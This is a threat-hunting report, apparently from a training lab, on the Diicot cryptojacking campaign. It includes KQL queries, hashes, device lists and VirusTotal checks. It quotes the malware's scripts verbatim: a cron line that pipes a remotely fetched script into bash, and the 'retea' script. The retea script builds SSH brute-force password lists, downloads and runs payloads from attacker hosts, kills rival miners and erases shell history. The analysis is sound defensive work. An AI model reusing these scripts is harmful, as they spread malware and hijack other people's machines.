"a9a4f021f91d1f35888c4e2fe7d2af2d458de8c8aba4f5815f1ed3125650c28f"
| distinct DeviceName
The following devices were discovered to have contained the .b file,
1. linux-programatic-ajs.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net
2. linux-programatic-ajs
3. linux-program-fix.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net
4. sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net
5. sakel-lunix-2
6. linux-programmatic-vm-danny.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net
7.linux-programatical-vul-remediation-lokesh.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp
.net
8. linuxvmdavid.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net
With the most recent .b cron job creation occurring at “2025-03-18T06:24:06.758628Z” on the
device “sakel-lunix-2.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net”.
The next bash script embedded in the Update payload is the .c file. Unlike the previous file,
threat hunting for the script proved to be more difficult. Querying the logs for either the file name
“.c” or an associated SHA1 hash proved to be unsuccessful. Despite multiple queries failing, I
was fortunate to identify a domain associated with Diicot’s .c scheduled task. The domain
digital.digitaldatainsights[.]org was distinguished and recognized while looking at script
activity found in the DeviceEvents table. The associated script executes,
#!/bin/bash\nif curl -s --connect-timeout 15 196[.]251[.]114[.]67/.x/black3; then\n curl -s
196[.]251[.]114[.]67/.x/black3 | bash >/dev/null 2>&1\nelse\n curl -s --connect-timeout 15
digital[.]digitaldatainsights[.]org/.x/black3 | bash >/dev/null 2>&1\nfi\n
The script silently fetches from the two URLs,
196[.]251[.]114[.]67/.x/black3 and digital[.]digitaldatainsights[.]org/.x/black3
attempting to fetch another possible script called “black3”. Having previously read the Wiz’s
report on Diicot’s malware campaigns, the domain is associated with the Bash script used in the
.c cron job. The URL digital[.]digitaldatainsights[.]org/.x/black3 is explicitly referenced as the
domain from which the malicious script initiates a download. Analyzing the IP address
196[.]251[.]114[.]67 from the script using VirusTotal revealed that it has also been flagged for
malicious activity.
Once the script was identified as being malicious in nature, the associated SHA256 hash value
was extracted for additional analysis.
SHA256: 1b1746b42c4ba33f653fe0822f12e3da51767c03347b1f2477e07a91b735b093
The SHA256 hash is not classified as malicious by VirusTotal at the moment. Using the script’s
SHA256 hash value, another query was constructed to search for the presence of similar scripts
in other systems within the CyberRange network.
Query
DeviceFileEvents
| where SHA256 ==
"1b1746b42c4ba33f653fe0822f12e3da51767c03347b1f2477e07a91b735b093"
| order by Timestamp asc
The returned logs identified the file name as 'ssshd' and indicated its presence on the following
devices,
1. linux-program-fix.p2zfvso05mlezjev3ck4vqd3kd.cx.internal.cloudapp.net
2. 28514056957f4ceedbafaeb39f57f1bdca663cf5
3. 8ef401b7733385b8b4d103697e43a26a590b2fb8
4. f0e5924acee5d577e8d2b2770974b934cef3c04e
Command and Control (C2) (T1071.001)
Diicot’s malware communicates with a C2 server multiple times as it runs. It sends two types of
reports, error reports and information about successful brute-force attempts against other
remote machines. Successful brute-force reports sent to the C2 server contain information such
as the victim’s IP address, system information and GPU availability. The reports are transmitted
using the curl command and contain the C2 server’s IP address in the header. Inspecting the
DeviceProcessEvents table for commands utilizing the curl command-line tool uncovered
activity resembling successful brute-force reporting to a C2 server.
Query
DeviceProcessEvents
| where Timestamp >= datetime(2024-11-01)
| where ProcessCommandLine contains "curl --silent"
| order by Timestamp desc
| distinct ProcessCommandLine
A quick inspection of the IP address 196[.]251[.]73[.]38 (referenced earlier in the report) with
VirusTotal indicated that the address was classified as malicious.
SSH Brute Force (T1110.001)
Another element of Diccot’s malicious payloads is their SSH brute-force capability. The payloads
target other systems it discovers, looking to exploit ones with weak credentials. Documented
Diccot attacks have observed the bisis binary scanning IPs in order to identify systems running
SSH. Once identified, the malware attempts to log into the systems by using a username and
password list.Filtering the DeviceNetworkEvents table for network logs where the initiating file
name was bisis revealed network activity consistent with SSH brute-force attacks conducted by
bisis.
Query
DeviceNetworkEvents
| where InitiatingProcessFileName contains "bisis"
| order by Timestamp asc
| project Timestamp, DeviceName, ActionType, RemoteIP, RemotePort, RemoteIPType,
InitiatingProcessFileName
Cryptomining (T1496.001)
This Diicot malware campaign includes crypto-jacking capabilities. The Update file checks a
system’s details and adapts its behavior depending on if it detects a cloud environment or a
standard CPU. The malware is observed to prioritize spreading itself within cloud environments.
While threat hunting for malicious script activity, a relevant script associated with crypto mining
activity was discovered. The retea payload found within CyberRange systems has several
elements that indicate cryptojacking.
Script
./retea -c ' #!/bin/bash key=$1 user=$2
if [[ $key ==
"KOFVwMxV7k7XjP7fwXPY6Cmp16vf8EnL54650LjYb6WYBtuSs3Zd1Ncr3SrpvnAU" ]]
then echo -e "" else echo Logged with successfully. rm -rf .retea crontab -r ; pkill xrx ;
pkill haiduc ; pkill blacku ; pkill xMEu ; cd /var/tmp ; rm -rf /dev/shm/.x
/var/tmp/.update-logs /var/tmp/Documents /tmp/.tmp ; mkdir /tmp/.tmp ; pkill Opera ; rm
-rf xmrig .diicot .black Opera ; rm -rf .black xmrig.1 ; pkill cnrig ; pkill java ; killall java ;
pkill xmrig ; killall cnrig ; killall xmrig ; wget -q dinpasiune.com/payload || curl -O -s -L
dinpasiune.com/payload || wget85.31.47.99/payload || curl -O -s -L85.31.47.99/payload ;
chmod +x * ; ./payload >/dev/null 2>&1 & disown ; history -c ; rm -rf .bash_history
~/.bash_history chmod +x .teaca ; ./.teaca > /dev/null 2>&1 ; history -c ; rm -rf
.bash_history ~/.bash_history fi
rm -rf /etc/sysctl.conf ; echo "fs.file-max = 2097152" > /etc/sysctl.conf ; sysctl -p ; ulimit
-Hn ; ulimit -n 99999 -u 999999
cd /dev/shm mkdir /dev/shm/.x > /dev/null 2>&1 mv network .x/ cd .x rm -rf retea ips
iptemp ips iplist sleep 1 rm -rf pass useri=cat /etc/passwd |grep -v nologin |grep -v false
|grep -v sync |grep -v halt|grep -v shutdown|cut -d: -f1 echo $useri > .usrs pasus=.usrs
check=grep -c . .usrs for us in $(cat $pasus) ; do printf "$us $us\n" >> pass printf "$us
$us"$us"\n" >> pass printf "$us "$us"123\n" >> pass printf "$us "$us"123456\n" >> pass
printf "$us 123456\n">> pass printf "$us 1\n">> pass printf "$us 12\n">> pass printf "$us
123\n">> pass printf "$us 1234\n">> pass printf "$us 12345\n">> pass printf "$us
12345678\n">> pass printf "$us 123456789\n">> pass printf "$us 123.com\n">> pass
printf "$us 123456.com\n">> pass printf "$us 123\n" >> pass printf "$us 1qaz@WSX\n" >>
pass printf "$us "$us"@123\n" >> pass printf "$us "$us"@1234\n" >> pass printf "$us
"$us"@123456\n" >> pass printf "$us "$us"123\n" >> pass printf "$us "$us"1234\n" >>
pass printf "$us "$us"123456\n" >> pass printf "$us qwer1234\n" >> pass printf "$us
111111\n">> pass printf "$us Passw0rd\n" >> pass printf "$us P@ssw0rd\n" >> pass
printf "$us qaz123!@#\n" >> pass printf "$us !@#\n" >> pass printf "$us password\n" >>
pass printf "$us Huawei@123\n" >> pass done wait sleep 0.5 cat bios.txt | sort -R | uniq |
uniq > i cat i > bios.txt ./network "rm -rf /var/tmp/Documents ; mkdir /var/tmp/Documents
2>&1 ; crontab -r ; chattr -iae ~/.ssh/authorized_keys >/dev/null 2>&1 ; cd /var/tmp ; chattr
-iae /var/tmp/Documents/.diicot ; pkill Opera ; pkill cnrig ; pkill java ; killall java ; pkill
xmrig ; killall cnrig ; killall xmrig ;cd /var/tmp/; mv /var/tmp/diicot
/var/tmp/Documents/.diicot ; mv /var/tmp/kuak /var/tmp/Documents/kuak ; cd
/var/tmp/Documents ; chmod +x .* ; /var/tmp/Documents/.diicot >/dev/null 2>&1 & disown
; history -c ; rm -rf .bash_history ~/.bash_history ; rm -rf /tmp/cache ; cd /tmp/ ; wget -q
85.31.47.99/.NzJjOTYwxx5/.balu || curl -O -s -L 85.31.47.99/.NzJjOTYwxx5/.balu ; mv .balu
cache ; chmod +x cache ; ./cache >/dev/null 2>&1 & disown ; history -c ; rm -rf
.bash_history ~/.bash_history" sleep 25 function Miner { rm -rf /dev/shm/retea
/dev/shm/.magic ; rm -rf /dev/shm/.x ~/retea /tmp/kuak /tmp/diicot /tmp/.diicot ; rm -rf
~/.bash_history history -c } Miner ' ./retea
KOFVwMxV7k7XjP7fwXPY6Cmp16vf8EnL54650LjYb6WYBtuSs3Zd1Ncr3SrpvnAU Haceru
The script specifically kills processes associated with other crypto miners (xmrig, cnrig, java)
and the script contains several instances of a payload download. Both the domain and the URL
found in the download command (dinpasiune[.]com, 85[.]31[.]47[.]99) are classified as
malicious by VirusTotal.
Conducting OSINT on the domain name revealed threat intelligence indicating that the domain
was indeed linked to cryptojacking activity.
(https://x.com/r3dbU7z/status/1648586927266832384/photo/1)
